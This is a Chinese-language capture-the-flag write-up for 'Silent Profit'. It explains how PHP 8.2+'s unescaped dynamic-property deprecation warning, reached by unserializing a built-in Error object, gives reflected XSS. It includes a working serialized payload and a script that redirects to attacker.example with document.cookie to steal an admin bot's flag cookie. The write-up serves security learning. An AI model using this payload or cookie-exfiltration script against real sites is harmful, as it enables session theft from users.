# Silent Profit

## 题目简述

目标站点只有两行 PHP：

```php
show_source(__FILE__);
unserialize($_GET['data']);
```

没有用户自定义类、魔术方法或反序列化后的对象操作，常规 POP 链不存在。管理员 bot 会给 `localhost` 设置可由 JavaScript 读取的 `flag` Cookie，再访问以 `http://localhost/` 开头的用户 URL。

真正的输出 gadget 来自 PHP 8.2 以后“创建动态属性已弃用”的运行时警告：反序列化一个内置 `Error` 对象，并把属性名设置为 HTML，Zend 会把该属性名拼入未经 HTML 转义的弃用消息，从而形成反射型 XSS。

## 解题过程

### 排除普通反序列化报错

可以先尝试畸形 enum 序列化，让错误信息回显可控类名。但这类警告通过 `php_error_docref()` 进入 `php_verror()`；启用 HTML 错误输出时，后者会对消息来源做 HTML 转义，因此 `<script>` 最终只显示为文本。

题目镜像是浮动的 `php:8-apache`，比赛环境对应 PHP 8.4 系列。自 PHP 8.2 起，给未允许动态属性的类创建未声明属性会触发：

```text
Creation of dynamic property Class::$property is deprecated
```

反序列化器的这条分支直接调用 `zend_error(E_DEPRECATED, ...)`，属性名会原样进入响应，正好绕开前述转义路径。

### 用 Error 的动态属性名注入脚本

`Error` 是已存在的内置类，可以直接反序列化。最小验证载荷为：

```text
O:5:"Error":1:{s:25:"<script>alert(1)</script>";N;}
```

字段含义如下：

- `O:5:"Error"`：建立类名长度为 5 的 `Error` 对象；
- `1`：对象包含一个属性；
- `s:25:"..."`：属性名是 25 字节脚本字符串；
- `N`：属性值为 `null`。

这个名字不属于 `Error` 的声明属性，因而触发弃用警告。生成实际载荷时不要手算长度，应对 UTF-8 编码后的完整属性名取 `len()`；长度少一个或多一个都会让 `unserialize()` 在更早的位置失败。

### 窃取 bot Cookie

把属性名换成外带脚本，例如：

```html
<script>
location="https://attacker.example/collect?c="+
encodeURIComponent(document.cookie)
</script>
```

压缩成单行并计算字节长度 $N$，得到：

```text
O:5:"Error":1:{s:N:"<script>location=...</script>";N;}
```

将整个序列化串 URL 编码后放进：

```text
http://localhost/?data=<encoded-payload>
```

再提交给 bot 的 `/report`。bot 先调用：

```javascript
browser.setCookie({
  name: "flag",
  value: flag,
  domain: "localhost"
});
```

随后打开目标 URL。响应中的弃用警告执行脚本，`document.cookie` 包含 `flag=...`，顶层跳转会把它发送到接收端。

## 方法总结

本题没有业务类 gadget，利用面来自 PHP 解释器自己的诊断路径。相似的错误信息并不具有相同安全属性：`php_error_docref()` 路线会转义 HTML，而动态属性弃用分支使用 `zend_error()`，可控属性名因而成为原始 HTML。

该技巧要求 PHP 8.2 及以上、弃用警告可显示，并且目标类不允许任意动态属性。`Error` 同时满足可反序列化和会触发弃用警告两个条件。源码追踪与可用序列化样例可参照 [Threalwinky 的 Silent Profit 题解](https://threalwinky.github.io/post/r3ctf2025/)，正文已说明普通 enum 报错为何不能执行脚本。
